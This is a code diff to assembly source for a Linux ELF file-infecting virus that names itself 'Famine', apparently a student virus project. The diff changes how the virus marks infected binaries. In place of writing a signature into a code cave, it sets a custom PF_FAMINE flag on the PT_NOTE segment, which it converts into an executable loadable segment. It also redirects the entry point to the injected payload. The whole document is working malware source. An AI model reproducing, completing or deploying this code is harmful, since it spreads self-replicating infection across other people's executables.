@@ -88,6 +88,8 @@ endstruc
 %define PT_NOTE 4
 %define PF_X 0x1
 %define PF_R 0x4
+; used to check if the file has been infected
+%define PF_FAMINE 0x8
 
 section .text
 
@@ -228,7 +230,6 @@ treat_file:
 	%local fd:qword					; long fd;
 	%local filesize:qword				; long filesize;
 	%local mappedfile:qword				; void *mappedfile;
-	%local signature_segment:qword			; struct elf64_phdr *signature_segment;
 	%local payload_offset:qword			; long payload_offset;
 	%local new_vaddr:qword				; Elf64_addr new_vaddr;
 	%local payload_size:qword			; long payload_size;
@@ -329,13 +330,7 @@ treat_file:
 	jne .unmap_file					; 	goto .unmap_file
 
 	; Check if file has a signature
-	mov rdi, [mappedfile]				; signature_segment = find_signature_segment(mappedfile);
-	call find_signature_segment			; ...
-	cmp rax, 0					; if (signature_segment == NULL)
-	je .unmap_file					; 	goto .unmap_file
-	mov [signature_segment], rax			; ...
-	mov rdi, [mappedfile]				; if (has_signature(mappedfile, signature_segment) == 1)
-	mov rsi, [signature_segment]			; ...
+	mov rdi, [mappedfile]				; if (has_signature(mappedfile) == 1)
 	call has_signature				; ...
 	cmp rax, 1					; ...
 	je .unmap_file					; 	goto .unmap_file
@@ -426,11 +421,6 @@ treat_file:
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
-	
-	; sign file
-	mov rdi, [mappedfile]				; sign(mappedfile, signature_segment);
-	mov rsi, [signature_segment]			; ...
-	call sign					; ...
 
 .unmap_file:
 	mov rax, SYS_MUNMAP				; _ret = munmap(
@@ -611,20 +601,18 @@ find_note_segment:
 	%pop
 	ret						; return res;
 
-;elf64_phdr *find_signature_segment(char const *_file_map)
-;rax find_signature_segment(rdi file_map);
-find_signature_segment:
+
+; int has_signature(char const *file_map)
+; rax has_signature(rdi file_map);
+has_signature:
 	%push context
 	%stacksize flat64
 	%assign %$localsize 0
 
 	%local file_map:qword				; char const *file_map;
-	%local res_header:qword				; elf64_phdr *res_header;
 	%local e_phoff:qword				; long e_phoff;
 	%local e_phentsize:qword			; long e_phentsize;
 	%local e_phnum:qword				; long e_phnum;
-	%local cur_segment_filesz:qword			; long cur_segment_filesz;
-	%local cur_segment_align:qword			; long cur_segment_align;
 
 	; Initializes stack frame
 	push rbp
@@ -649,31 +637,14 @@ find_signature_segment:
 		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
 		imul rcx, rsi				; 		...
 		add rax, rcx				; 		...
-		mov [res_header], rax			; res_header = cur_phdr;
 
-		; check segment is not PT_NOTE
-		mov rdi, [res_header]			; if (cur_phdr->p_type == PT_NOTE)
-		add rdi, elf64_phdr.p_type		; ...
+		; check if PT_FAMINE
+		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_FAMINE))
+		add rdi, elf64_phdr.p_flags		; ...
 		mov eax, [rdi]				; ...
-		cmp eax, PT_NOTE			; ...
-		je .next_phdr_loop			; 	goto next_phdr_loop;
-
-		; check codecave size
-		mov rdi, [res_header]			; cur_segment_filesz = cur_phdr->p_filesz;
-		add rdi, elf64_phdr.p_filesz		; ...
-		mov rax, [rdi]				; ...
-		mov [cur_segment_filesz], rax		; ...
-		mov rdi, [res_header]			; cur_segment_align = cur_phdr->p_align;
-		add rdi, elf64_phdr.p_align		; ...
-		mov rax, [rdi]				; ...
-		mov [cur_segment_align], rax		; ...
-		mov rax, [cur_segment_filesz]		; cur_segment_filesz%cur_segment_align
-		mov rdi, [cur_segment_align]		; ...
-		xor rdx, rdx				; ...
-		div rdi					; ...
-		sub rdi, rax				; cave = cur_segment_align - cur_segment_filesz%cur_segment_align
-		cmp rdi, len_signature			; if (cave < len_signature)
-		jl .next_phdr_loop			; 	goto next_phdr_loop;
+		and eax, PF_FAMINE			; ...
+		cmp eax, PF_FAMINE			; ...
+		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
 
@@ -688,7 +659,7 @@ find_signature_segment:
 		jmp .end				; goto end
 
 	.found:
-		mov rax, [res_header]			; res = res_header;
+		mov rax, 1				; res = 1;
 		jmp .end				; goto end
 
 .end:
@@ -696,65 +667,6 @@ find_signature_segment:
 	pop rbp
 	%pop
 	ret						; return res;
-
-
-; int has_signature(char const *file_map, elf64_phdr *segment)
-; rax has_signature(rdi file_map, rsi segment);
-has_signature:
-	push rsi
-	add rsi, elf64_phdr.p_offset			; offset = segment->p_offset;
-	mov rax, [rsi]					; ..
-	add rdi, rax					; file_map += offset;
-	
-	pop rsi
-	add rsi, elf64_phdr.p_filesz			; size = segment->p_filesz;
-	mov rax, [rsi]					; ..
-	add rdi, rax					; file_map += size;
-
-	mov rsi, 0					; counter = 0;
-	.begin_signature_loop:				; while (true) {
-		mov al, [rdi + rsi]			; 	_c = file_map[counter];
-		lea r8, [rel signature]
-		mov bl, [r8 + rsi]			; 	_signature_c = signature[counter];
-		cmp al, bl				; 	if (_c != _signature_c)
-		jne .end_not_equal			; 		goto end_not_equal;
-		inc rsi					; 	counter++;
-		cmp rsi, len_signature			; 	if (counter == len_signature)
-		je .end_equal				; 		goto end_equal;
-		jmp .begin_signature_loop			; }
-	
-	.end_not_equal:
-		xor rax, rax				; return 0;
-		ret
-
-	.end_equal:
-		mov rax, 1				; return 1;
-		ret
-
-; void sign(char const *file_map, elf64_phdr *segment)
-; void sign(rdi file_map, rsi segment);
-sign:
-	push rsi
-	add rsi, elf64_phdr.p_offset			; offset = segment->p_offset;
-	mov rax, [rsi]					; ..
-	add rdi, rax					; file_map += offset;
-	
-	pop rsi
-	add rsi, elf64_phdr.p_filesz			; size = segment->p_filesz;
-	mov rax, [rsi]					; ..
-	add rdi, rax					; file_map += size;
-
-	mov rsi, 0					; counter = 0;
-	.begin_signature_loop:				; while (true) {
-		mov bl, [signature + rsi]		; 	_signature_c = signature[counter];
-		mov [rdi + rsi], bl			; 	file_map[counter] = _signature_c;
-		inc rsi					; 	counter++;
-		cmp rsi, len_signature			; 	if (counter == len_signature)
-		je .end					; 		goto end;
-		jmp .begin_signature_loop			; }
-	
-	.end:
-		ret
 
 ; bool convert_pt_note_to_load(char const *_file_map,
 ;			       Elf64_Off _new_offset,
@@ -820,7 +732,7 @@ convert_pt_note_to_load:
 
 	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
 	add rdi, elf64_phdr.p_flags			; ...
-	mov DWORD [rdi], PF_X | PF_R			; *_flags_ptr = PF_X | PF_R;
+	mov DWORD [rdi], PF_X | PF_R | PF_FAMINE	; *_flags_ptr = PF_X | PF_R | PF_FAMINE;
 
 	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
 	add rdi, elf64_phdr.p_offset			; ...
@@ -871,7 +783,7 @@ section .data
 	len_err_msg: equ $ - err_msg
 	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	len_elf_64_magic: equ $ - elf_64_magic
+	; never used but here to be copied in the binary
 	signature: db "Famine v1.0 by jmaia and dhubleur"
-	len_signature: equ $ - signature
 
 _end:
